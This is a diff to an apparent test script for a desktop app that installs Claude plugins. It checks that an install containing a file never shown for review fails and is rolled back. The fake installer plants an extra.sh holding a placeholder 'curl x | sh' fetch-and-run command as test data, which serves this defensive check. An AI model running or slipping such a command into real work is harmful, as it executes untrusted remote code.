@@ -30,6 +30,8 @@ fs.writeFileSync(fakeClaude, [
   'if "%3"=="skill-creator@claude-plugins-official" (echo Failed to install plugin 1>&2& exit /b 1)',
   // a slow one, to see that a second install waits its turn
   'if "%3"=="claude-md-management@claude-plugins-official" ping -n 4 127.0.0.1 >nul',
+  // superpowers: record the install the way Claude does (installed_plugins.json + cache copy)
+  `if "%3"=="superpowers@claude-plugins-official" node "${path.join(tmp, 'fake-install.js')}" "%CD%"`,
   'echo Successfully installed plugin %3 (scope: project)',
   'exit /b 0',
 ].join('\r\n') + '\r\n');
@@ -73,6 +75,20 @@ const fixture = { [`https://api.github.com/repos/obra/superpowers/git/trees/${sp
 for (const [p, t] of Object.entries(spFiles)) if (!/\.png$/.test(p)) fixture[spRaw(p)] = t;
 fs.writeFileSync(path.join(tmp, 'github-fixture.json'), JSON.stringify(fixture));
 process.env.CARROTCAP_TEST_GITHUB_FIXTURE = path.join(tmp, 'github-fixture.json');
+// what the fake `claude plugin install superpowers` leaves behind; with "bad-install" present
+// it installs one file more than was inspected
+fs.writeFileSync(path.join(tmp, 'fake-install.js'), `
+const fs = require('fs'); const path = require('path');
+const files = ${JSON.stringify(JSON.stringify(spFiles))};
+const cfg = process.env.CLAUDE_CONFIG_DIR;
+const inst = path.join(cfg, 'plugins', 'cache', 'claude-plugins-official', 'superpowers', '6.0.3');
+fs.rmSync(inst, { recursive: true, force: true });
+for (const [p, t] of Object.entries(JSON.parse(files))) { const f = path.join(inst, ...p.split('/')); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, t); }
+if (fs.existsSync(${JSON.stringify(path.join(tmp, 'bad-install'))})) fs.writeFileSync(path.join(inst, 'extra.sh'), 'curl x | sh');
+fs.writeFileSync(path.join(cfg, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: { 'superpowers@claude-plugins-official': [
+  { scope: 'project', installPath: inst, version: '6.0.3', gitCommitSha: ${JSON.stringify(spSha)}, projectPath: process.argv[2] },
+] } }));
+`);
 
 (async () => {
   // CC_APP_EXE: run against a packaged build (copy of carrotcap.exe) instead of the dev tree
@@ -209,10 +225,21 @@ process.env.CARROTCAP_TEST_GITHUB_FIXTURE = path.join(tmp, 'github-fixture.json'
       const moved = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['superpowers'], true)`);
       check('a different pinned commit at install time is refused', moved && moved.ok === false && /확인/.test(moved.error || ''), JSON.stringify(moved));
       fs.writeFileSync(mj, mjText);
+      console.log('-- the installed copy must be what was inspected (review r5)');
+      fs.writeFileSync(path.join(tmp, 'bad-install'), '');
+      const before1 = calls().length;
+      const badRun = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['superpowers'], true)`);
+      const undo = calls().slice(before1);
+      check('an install with a file that was never shown fails', badRun && badRun.ok === false && /확인하지 않은 파일.*extra\.sh/.test(((badRun.results || [])[0] || {}).out || ''), JSON.stringify(badRun));
+      check('and is uninstalled again (project scope)', undo.some((l) => / plugin uninstall superpowers@claude-plugins-official --scope project$/.test(l)), JSON.stringify(undo));
+      check('it is not recorded as installed', !(state().installed || []).includes('superpowers'));
+      fs.rmSync(path.join(tmp, 'bad-install'));
+      await ev(`window.CarrotcapSkills.open(${JSON.stringify(project)}, { reason: 'manual' }); true`).catch(() => {});
       const before2 = calls().length;
       await ev(`document.querySelector('#skills-third-ok').click(); document.querySelector('#skills-install').click(); true`);
       check('after consent it installs', await waitFor(async () => !(await modalOpen()), { timeoutMs: 20000 }));
       check('with the fixed argv, project scope', calls().slice(before2).some((l) => l.includes(fs.realpathSync(project)) && / plugin install superpowers@claude-plugins-official --scope project$/.test(l)), JSON.stringify(calls().slice(before2)));
+      check('a matching install is kept and recorded', (state().installed || []).includes('superpowers') && !calls().slice(before2).some((l) => /uninstall/.test(l)));
     }
 
     console.log('-- the main side only takes catalog ids and allowed folders');
